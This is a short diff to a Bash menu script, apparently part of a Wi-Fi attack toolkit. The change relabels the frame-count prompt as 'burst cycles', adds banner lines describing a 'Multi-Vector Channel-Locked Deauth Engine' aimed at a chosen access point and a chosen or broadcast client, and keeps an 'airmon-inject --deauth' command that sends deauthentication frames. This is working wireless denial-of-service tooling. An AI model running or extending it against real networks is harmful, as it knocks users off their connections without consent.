@@ -666,11 +666,16 @@ menu_packet_sender() {
                     esac
                 fi
 
-                echo -en "\n${C_YLW}Enter number of deauth frames to send (default: 10): ${C_RST}"
+                echo -en "\n${C_YLW}Enter number of burst cycles (default: 10 cycles = 150+ multi-vector frames): ${C_RST}"
                 read -r num_frames
                 num_frames="${num_frames:-10}"
 
-                echo -e "\n${C_CYN}[*] Sending $num_frames deauth frames to $SELECTED_BSSID (Client: ${SELECTED_CLIENT:-ff:ff:ff:ff:ff:ff})...${C_RST}"
+                echo -e "\n${C_CYN}[*] Launching Multi-Vector Channel-Locked Deauth Engine...${C_RST}"
+                echo -e "${C_WHT}[★] Target AP:     ${C_CYN}$SELECTED_BSSID ($SELECTED_ESSID)${C_RST}"
+                echo -e "${C_WHT}[★] Target Client: ${C_CYN}${SELECTED_CLIENT:-ff:ff:ff:ff:ff:ff (Broadcast)}${C_RST}"
+                echo -e "${C_WHT}[★] Frequency:     ${C_CYN}Channel $SELECTED_CH (Strict RF Lock)${C_RST}"
+                echo -e "${C_WHT}[★] Attack Vector: ${C_CYN}Bidirectional (AP->STA + STA->AP, Interleaved Deauth/Disassoc)${C_RST}\n"
+
                 airmon-inject --deauth -a "$SELECTED_BSSID" -d "${SELECTED_CLIENT:-ff:ff:ff:ff:ff:ff}" -c "$SELECTED_CH" -n "$num_frames"
                 pause
                 ;;
